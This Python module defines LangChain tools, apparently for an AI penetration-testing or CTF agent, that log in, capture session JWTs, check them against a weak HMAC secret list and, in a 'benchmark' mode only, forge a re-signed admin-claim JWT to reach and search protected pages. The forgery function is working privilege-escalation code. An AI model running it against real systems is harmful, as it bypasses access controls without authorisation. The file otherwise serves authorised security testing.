"""Ephemeral authenticated sessions and JWT evidence tools."""

from __future__ import annotations

import contextvars
import hashlib
import hmac
import json
import re
import uuid
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urljoin, urlparse

import requests
from langchain_core.tools import tool

from .http_client import normalize_url, same_origin
from .jwt_attack_tools import WEAK_HMAC_SECRETS, _b64url_encode, _parse_jwt
from .results import Evidence, Finding, RequestRecord, ResponseRecord, ToolResult, error_result


_scan_mode: contextvars.ContextVar[str] = contextvars.ContextVar("auth_session_mode", default="production")


def set_auth_session_mode(mode: str):
    return _scan_mode.set(mode)


def reset_auth_session_mode(token: contextvars.Token[str]) -> None:
    _scan_mode.reset(token)


@dataclass
class AuthSession:
    origin: str
    session: requests.Session
    jwt_cookie: str | None
    jwt_token: str | None
    privileged_token: str | None = None
    validated_paths: set[str] = field(default_factory=set)


_sessions: dict[str, AuthSession] = {}


def _safe_claims(value: Any) -> Any:
    if isinstance(value, dict):
        return {key: "[REDACTED]" if key.lower() in {"password", "token", "secret"} else _safe_claims(item) for key, item in value.items()}
    if isinstance(value, list):
        return [_safe_claims(item) for item in value]
    return value


def _get_session(session_ref: str) -> AuthSession | None:
    return _sessions.get(session_ref)


def _session_cookies(stored: AuthSession, token: str | None = None) -> requests.cookies.RequestsCookieJar:
    cookies = requests.cookies.RequestsCookieJar()
    for cookie in stored.session.cookies:
        value = token if token and cookie.name == stored.jwt_cookie else cookie.value
        cookies.set(cookie.name, value, domain=cookie.domain, path=cookie.path)
    return cookies


def _denied_response(response: requests.Response) -> bool:
    if response.status_code in {401, 403}:
        return True
    text = response.text.lower()
    markers = ("not admin", "not an admin", "login to access", "unauthorized", "forbidden", "access denied", "permission denied")
    return any(marker in text for marker in markers)


def _jwt_from_cookies(session: requests.Session) -> tuple[str | None, str | None]:
    for cookie in session.cookies:
        if cookie.value.count(".") == 2 and _parse_jwt(cookie.value):
            return cookie.name, cookie.value
    return None, None


def _hmac_secret(token: str) -> tuple[str | None, dict[str, Any] | None]:
    parsed = _parse_jwt(token)
    if parsed is None:
        return None, None
    header, payload, signature, signing_input = parsed
    alg = str(header.get("alg", ""))
    hashers = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hasher = hashers.get(alg)
    if hasher is None:
        return None, {"header": header, "payload": payload, "algorithm": alg}
    for secret in WEAK_HMAC_SECRETS:
        candidate = _b64url_encode(hmac.new(secret.encode(), signing_input.encode(), hasher).digest())
        if hmac.compare_digest(candidate, signature):
            return secret, {"header": header, "payload": payload, "algorithm": alg}
    return None, {"header": header, "payload": payload, "algorithm": alg}


@tool
def auth_login(url: str, username: str, password: str, username_field: str = "username", password_field: str = "password") -> str:
    """登录并捕获一次性内存会话，返回 session_ref、重定向与脱敏 JWT 元数据。

    使用于已授权登录流程。完整 Cookie、JWT 和密码不会写入工具输出、遥测或案例。
    """
    target = normalize_url(url)
    try:
        session = requests.Session()
        response = session.post(
            target, data={username_field: username, password_field: password},
            allow_redirects=False, timeout=10, verify=False,
        )
        jwt_cookie, jwt_token = _jwt_from_cookies(session)
        session_ref = f"auth_{uuid.uuid4().hex[:16]}"
        origin = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
        _sessions[session_ref] = AuthSession(origin, session, jwt_cookie, jwt_token)
        location = response.headers.get("Location", "")
        jwt_meta: dict[str, Any] = {"present": bool(jwt_token), "cookie_name": jwt_cookie}
        if jwt_token:
            parsed = _parse_jwt(jwt_token)
            if parsed:
                jwt_meta.update({"algorithm": parsed[0].get("alg"), "claim_keys": sorted(parsed[1].keys())})
        return ToolResult(
            tool="auth_login", target=target, status="ok",
            summary=f"Login response HTTP {response.status_code}; session captured",
            raw_excerpt=(f"[auth_login] {target}\nStatus: {response.status_code}\n"
                         f"Redirect: {location or '(none)'}\nSession reference: {session_ref}\n"
                         f"JWT captured: {'yes' if jwt_token else 'no'}"),
            request=RequestRecord("POST", target, parameters={"username_field": username_field, "password_field": password_field}),
            response=ResponseRecord(status_code=response.status_code, content_type=response.headers.get("Content-Type"), body_length=len(response.content)),
            data={"session_ref": session_ref, "redirect": location, "cookie_names": [cookie.name for cookie in session.cookies], "jwt": jwt_meta},
        ).to_text()
    except Exception as exc:
        return error_result("auth_login", target, exc).to_text()


@tool
def session_jwt_review(session_ref: str) -> str:
    """查看内存会话中的 JWT 算法与脱敏 claims，不暴露原始 token。"""
    stored = _get_session(session_ref)
    if stored is None or not stored.jwt_token:
        return error_result("session_jwt_review", session_ref, "JWT session was not found").to_text()
    parsed = _parse_jwt(stored.jwt_token)
    if parsed is None:
        return error_result("session_jwt_review", session_ref, "captured cookie is not a valid JWT").to_text()
    header, payload, _signature, _input = parsed
    return ToolResult(
        tool="session_jwt_review", target=session_ref, status="ok",
        summary=f"Captured JWT uses {header.get('alg', 'unknown')}",
        raw_excerpt=f"[session_jwt_review]\nAlgorithm: {header.get('alg', 'unknown')}\nClaims: {json.dumps(_safe_claims(payload), ensure_ascii=False)}",
        data={"algorithm": header.get("alg"), "header": header, "claims": _safe_claims(payload), "session_ref": session_ref},
    ).to_text()


@tool
def session_jwt_hmac_check(session_ref: str) -> str:
    """对内存 JWT 使用固定小型弱密钥集合验证签名，不返回密钥或 token。"""
    stored = _get_session(session_ref)
    if stored is None or not stored.jwt_token:
        return error_result("session_jwt_hmac_check", session_ref, "JWT session was not found").to_text()
    secret, metadata = _hmac_secret(stored.jwt_token)
    if metadata is None:
        return error_result("session_jwt_hmac_check", session_ref, "invalid JWT format").to_text()
    weak = secret is not None
    findings = [Finding(
        title="JWT 使用弱签名密钥", severity="critical", confidence="confirmed", category="jwt_attack",
        evidence=[Evidence("weak_hmac_key", "A fixed weak-key verification set validated the JWT signature.", stored.origin)],
        reproduction=["在授权测试中验证 JWT 签名密钥强度并轮换为高熵密钥。"],
    )] if weak else []
    return ToolResult(
        tool="session_jwt_hmac_check", target=session_ref, status="ok",
        summary="JWT weak HMAC key confirmed" if weak else "No fixed weak HMAC key matched",
        raw_excerpt=f"[session_jwt_hmac_check]\nAlgorithm: {metadata['algorithm']}\nWeak key: {'confirmed' if weak else 'not found'}\nTested: {len(WEAK_HMAC_SECRETS)} fixed candidates",
        findings=findings,
        data={"algorithm": metadata["algorithm"], "weak_key_confirmed": weak, "tested": len(WEAK_HMAC_SECRETS), "session_ref": session_ref},
    ).to_text()


@tool
def session_jwt_privilege_check(session_ref: str, path: str, claim: str = "admin") -> str:
    """仅在 benchmark 模式下，用已确认弱签名的内存 JWT 验证受保护路径的权限差异。

    不返回伪造 token、密钥或完整响应。生产模式只返回拒绝，避免自动提权操作。
    """
    if _scan_mode.get() != "benchmark":
        return error_result("session_jwt_privilege_check", session_ref, "privilege validation is restricted to benchmark mode").to_text()
    stored = _get_session(session_ref)
    if stored is None or not stored.jwt_token or not stored.jwt_cookie:
        return error_result("session_jwt_privilege_check", session_ref, "JWT session was not found").to_text()
    target = normalize_url(urljoin(stored.origin + "/", path))
    if not same_origin(stored.origin, target):
        return error_result("session_jwt_privilege_check", target, "target is outside the authenticated session origin").to_text()
    secret, metadata = _hmac_secret(stored.jwt_token)
    if not secret or not metadata or not str(metadata["algorithm"]).startswith("HS"):
        return error_result("session_jwt_privilege_check", session_ref, "a confirmed weak HMAC key is required").to_text()
    payload = json.loads(json.dumps(metadata["payload"]))
    if claim in payload:
        payload[claim] = True
    elif isinstance(payload.get("sub"), dict) and claim in payload["sub"]:
        payload["sub"][claim] = True
    else:
        return error_result("session_jwt_privilege_check", session_ref, f"claim '{claim}' was not found in JWT claims").to_text()
    header = metadata["header"]
    signing_input = f"{_b64url_encode(json.dumps(header, separators=(',', ':')).encode())}.{_b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"
    hasher = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[metadata["algorithm"]]
    forged = f"{signing_input}.{_b64url_encode(hmac.new(secret.encode(), signing_input.encode(), hasher).digest())}"
    try:
        baseline = requests.get(target, cookies=_session_cookies(stored), allow_redirects=False, timeout=10, verify=False)
        response = requests.get(target, cookies=_session_cookies(stored, forged), allow_redirects=False, timeout=10, verify=False)
        baseline_hash = hashlib.sha256(baseline.content).hexdigest()
        body_hash = hashlib.sha256(response.content).hexdigest()
        baseline_denied = _denied_response(baseline)
        content_changed = baseline_hash != body_hash
        validated = bool(
            baseline_denied
            and response.status_code in {200, 201, 202, 204}
            and content_changed
        )
        if validated:
            stored.privileged_token = forged
            stored.validated_paths.add(target)
        return ToolResult(
            tool="session_jwt_privilege_check", target=target, status="ok",
            summary="Benchmark privilege validation verified" if validated else "Benchmark privilege validation was inconclusive",
            raw_excerpt=(
                f"[session_jwt_privilege_check]\nTarget: {target}\n"
                f"Baseline status: {baseline.status_code}\nForged status: {response.status_code}\n"
                f"Baseline denied: {'yes' if baseline_denied else 'no'}\n"
                f"Response changed: {'yes' if content_changed else 'no'}\n"
                f"Forged response SHA-256: {body_hash}\n"
                f"Privilege validation: {'verified' if validated else 'inconclusive'}"
            ),
            findings=[Finding("JWT privilege claim forgery accepted", "critical", "confirmed", "jwt_attack", [Evidence("jwt_privilege_validation", "A re-signed privileged JWT changed an access-denied response to an allowed response.", target)], [])] if validated else [],
            data={
                "baseline_status_code": baseline.status_code,
                "baseline_sha256": baseline_hash,
                "baseline_denied": baseline_denied,
                "status_code": response.status_code,
                "response_sha256": body_hash,
                "content_changed": content_changed,
                "claim": claim,
                "validated": validated,
            },
        ).to_text()
    except Exception as exc:
        return error_result("session_jwt_privilege_check", target, exc).to_text()


@tool
def session_response_search(session_ref: str, path: str, keyword_or_regex: str) -> str:
    """Only in benchmark mode, search a previously verified privileged session response.

    The request remains bound to an in-memory session and same-origin path. It returns
    bounded matching context, so a CTF flag can be reported without exposing the JWT.
    """
    if _scan_mode.get() != "benchmark":
        return error_result("session_response_search", session_ref, "authenticated response search is restricted to benchmark mode").to_text()
    stored = _get_session(session_ref)
    if stored is None or not stored.privileged_token:
        return error_result("session_response_search", session_ref, "a verified privileged JWT session is required").to_text()
    target = normalize_url(urljoin(stored.origin + "/", path))
    if not same_origin(stored.origin, target):
        return error_result("session_response_search", target, "target is outside the authenticated session origin").to_text()
    if target not in stored.validated_paths:
        return error_result("session_response_search", target, "privilege validation for this path is required first").to_text()
    query = keyword_or_regex.strip()
    if not query:
        return error_result("session_response_search", target, "keyword_or_regex must not be empty").to_text()
    try:
        pattern = re.compile(query[6:] if query.startswith("regex:") else re.escape(query))
    except re.error as exc:
        return error_result("session_response_search", target, f"invalid regular expression: {exc}").to_text()
    try:
        response = requests.get(target, cookies=_session_cookies(stored, stored.privileged_token), allow_redirects=False, timeout=10, verify=False)
        body = response.text
        if len(response.content) > 2 * 1024 * 1024:
            return error_result("session_response_search", target, "response exceeds the 2 MiB search limit").to_text()
        matches = list(pattern.finditer(body))
        contexts = []
        for match in matches[:10]:
            start = max(0, match.start() - 120)
            end = min(len(body), match.end() + 120)
            contexts.append(body[start:end])
        return ToolResult(
            tool="session_response_search", target=target, status="ok",
            summary=f"Privileged response search: {'matches' if matches else 'no matches'} ({len(matches)} matches)",
            raw_excerpt=(
                f"[session_response_search] {target}\nStatus: {response.status_code}\n"
                f"Response SHA-256: {hashlib.sha256(response.content).hexdigest()}\n"
                f"Matches: {len(matches)}\n" + "\n---\n".join(contexts)
            ),
            request=RequestRecord("GET", target),
            response=ResponseRecord(status_code=response.status_code, content_type=response.headers.get("Content-Type"), body_length=len(response.content)),
            data={"match_count": len(matches), "response_sha256": hashlib.sha256(response.content).hexdigest(), "path_verified": True},
        ).to_text()
    except Exception as exc:
        return error_result("session_response_search", target, exc).to_text()
